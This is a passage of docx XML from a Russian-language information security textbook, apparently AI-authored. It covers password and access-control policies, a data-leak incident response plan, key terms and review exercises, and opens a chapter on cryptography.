    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хранить данные зашифрованными</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Не передавать третьим лицам без согласия</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.1.9. Примеры политик безопасности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Давай посмотрим, как выглядят реальные политики.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Политика паролей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Требования к паролям</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Минимум 12 символов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Содержит заглавные и строчные буквы, цифры, спецсимволы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не содержит имя пользователя, компании, общеупотребительные слова</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Срок действия: 90 дней</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нельзя повторно использовать последние 5 паролей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Хранение паролей</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хранятся в зашифрованном виде (bcrypt, Argon2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Запрещено хранить пароли в открытом виде, Excel-таблицах, бумажных блокнотах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Многофакторная аутентификация (2FA)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обязательна для администраторов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обязательна для удалённого доступа (VPN)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Рекомендуется для всех пользователей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Блокировка аккаунта</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>После 5 неудачных попыток входа — блокировка на 15 минут</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Разграничение доступа в компании</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Роль | Доступ |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------|--------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CEO (Генеральный директор)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Полный доступ ко всем системам |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CTO (Технический директор)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Серверы, репозиторий кода, инфраструктура |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CISO (Директор по ИБ)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Логи, SIEM, firewall, IDS/IPS |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HR-менеджер</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | База сотрудников, зарплаты |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Разработчик</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Репозиторий кода, тестовая БД |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дизайнер</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Графические файлы, макеты |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Бухгалтер</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Финансовая система, счета |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Системный администратор</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Серверы, ОС, резервное копирование |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стажёр</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Только read-only доступ к документации |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Стажёр </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не имеет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> доступа к production-серверам. Разработчик </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не имеет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> доступа к зарплатам.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Реагирование на инцидент — утечка данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сценарий</w:t>
      </w:r>
      <w:r>
        <w:t>: В даркнете появилась база данных с email/паролями пользователей твоего сайта (500,000 записей).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>План действий</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>День 1 (0-4 часа):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Подтверждение инцидента**: проверить, действительно ли это наша база (хэши, структура)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сдерживание**: отключить доступ к БД, сменить пароли администраторов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Оценка масштаба**: сколько записей утекло, какая информация (только email/пароли или ещё платёжные данные?)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>День 1 (4-24 часа):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уведомление**: сообщить пользователям об утечке (email, баннер на сайте)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Форсированная смена паролей**: все пользователи обязаны сменить пароли при следующем входе</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уведомление регуляторов**: сообщить в Роскомнадзор (Россия) или в надзорный орган (GDPR — 72 часа)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>День 2-7:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расследование**: как произошла утечка? SQL-инъекция? Взлом admin-панели? Инсайдер?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Устранение уязвимости**: закрыть дыру (обновить ПО, изменить конфигурацию)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Мониторинг**: проверить логи, нет ли других следов атаки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>После инцидента:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Анализ**: написать отчёт (что произошло, почему, как предотвратить)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Обновление политики**: внедрить дополнительные меры (например, обязательная 2FA)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Обучение**: провести тренинг для команды</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.1.10. Связь с другими главами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 9.02 (Криптографические методы)**: Шифрование — ключевая техническая мера защиты конфиденциальности (AES, RSA, TLS/SSL).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 9.03 (Понятия ИБ. Угрозы)**: Политика безопасности защищает от угроз (вирусы, DDoS, социальная инженерия, инсайдеры).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 9.04 (Противодействие нарушению конфиденциальности)**: Технические и организационные меры из политики безопасности.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 9.05 (Атаки)**: Политика безопасности направлена на предотвращение атак (фишинг, SQL-инъекция, brute force).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 9.06 (Методы реализации угроз)**: Политика безопасности содержит меры противодействия (firewall против сетевых атак, антивирусы против вирусов).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 9.07 (Юридические основы ИБ)**: Политика безопасности должна соответствовать законам (GDPR, 152-ФЗ, ISO 27001).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 3.01 (ОС)**: Разграничение доступа на уровне ОС (пользователи, группы, права доступа), аудит логов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 7.02 (БД)**: Защита баз данных (шифрование, резервное копирование, контроль доступа).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 8.04 (Протоколы Internet)**: Firewall фильтрует трафик на уровне TCP/IP.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Политика безопасности (Security Policy)** — формализованные правила защиты информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CIA Triad** — Конфиденциальность (Confidentiality), Целостность (Integrity), Доступность (Availability)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Идентификация** — определение личности ("Кто ты?")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Аутентификация** — проверка личности ("Докажи, что это ты")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Авторизация** — проверка прав доступа ("Что тебе разрешено?")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Многофакторная аутентификация (MFA / 2FA)** — проверка двумя или более способами (пароль + SMS-код)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DAC (Discretionary Access Control)** — дискреционное управление доступом (владелец решает)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**MAC (Mandatory Access Control)** — мандатное управление (система решает на основе меток секретности)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**RBAC (Role-Based Access Control)** — ролевое управление (доступ на основе роли)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ABAC (Attribute-Based Access Control)** — атрибутное управление (доступ на основе атрибутов: роль, время, IP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Принцип наименьших привилегий (Least Privilege)** — минимально необходимые права</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифрование (Encryption)** — преобразование данных в нечитаемый вид</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Firewall** — межсетевой экран, фильтр трафика</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IDS (Intrusion Detection System)** — система обнаружения вторжений</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IPS (Intrusion Prevention System)** — система предотвращения вторжений</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Резервное копирование (Backup)** — создание копий данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Правило 3-2-1** — 3 копии, 2 типа носителей, 1 offsite</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Incident Response Plan (IRP)** — план реагирования на инциденты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ISO 27001** — международный стандарт СУИБ (ISMS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**GDPR** — европейский закон о защите персональных данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**152-ФЗ** — российский закон о персональных данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Теоретические:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое политика безопасности?** Зачем она нужна организации?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое CIA Triad?** Опиши каждый компонент (конфиденциальность, целостность, доступность) и приведи примеры нарушений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**В чём разница между идентификацией, аутентификацией и авторизацией?** Приведи примеры.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сравни модели управления доступом: DAC, MAC, RBAC, ABAC.** В каких случаях какую модель использовать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое принцип наименьших привилегий?** Почему важно его соблюдать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Зачем нужно резервное копирование?** Что такое правило 3-2-1?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое ISO 27001?** Зачем компании проходить сертификацию?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**В чём разница между IDS и IPS?**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Практические:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача: Политика паролей.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Компания требует, чтобы пароли содержали минимум 8 символов, заглавные и строчные буквы, цифры. Пользователь выбрал пароль `Password123`.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Насколько безопасен этот пароль?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Почему он плохой?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Предложи более безопасный вариант.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача: Разграничение доступа.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    В компании 4 роли: Админ, Разработчик, HR-менеджер, Стажёр.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Ресурсы: `/production` (production-серверы), `/code` (репозиторий кода), `/hr` (база сотрудников).  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие роли должны иметь доступ к каким ресурсам?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обоснуй свой выбор с точки зрения принципа наименьших привилегий.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача: Реагирование на инцидент.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Антивирус обнаружил ransomware на компьютере бухгалтера. Файлы начали шифроваться.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Опиши шаги Incident Response Plan (сдерживание, удаление, восстановление).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Как предотвратить подобное в будущем?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача: Расчёт объёма backup.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    База данных занимает 500 GB. Каждый день изменяется 2% данных. Используется схема:  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Понедельник: Full backup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вторник-Воскресенье: Incremental backup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сколько данных будет в каждом Incremental backup?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сколько данных нужно хранить для восстановления в воскресенье?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Incremental backup (вт-вс): 500 GB × 2% = 10 GB каждый день</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для восстановления в воскресенье нужно:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  Full (пн) + Incremental (вт-вс) = 500 + 10×6 = 500 + 60 = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>560 GB</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статус</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Глава готова ✅  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дата</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 15 января 2026  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Автор</w:t>
      </w:r>
      <w:r>
        <w:t>: AI Assistant (Claude Sonnet 4.5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Следующая глава</w:t>
      </w:r>
      <w:r>
        <w:t>: 9.02 Криптографические методы защиты данных (симметричное/асимметричное шифрование, AES, RSA, цифровые подписи, TLS/SSL).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 9.2. Криптографические методы защиты данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение: Шифруй, блин, всё что движется</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Окей, в прошлой главе мы разобрали политику безопасности — документы, правила, кто за что отвечает. Круто, но теперь давай по делу: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как на практике защитить данные?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Самый мощный способ — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>криптография</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (от греч. κρυπτός — "скрытый", γράφω — "пишу"). Это наука о методах шифрования информации, чтобы её мог прочитать только тот, кому она предназначена.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем нужна криптография?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
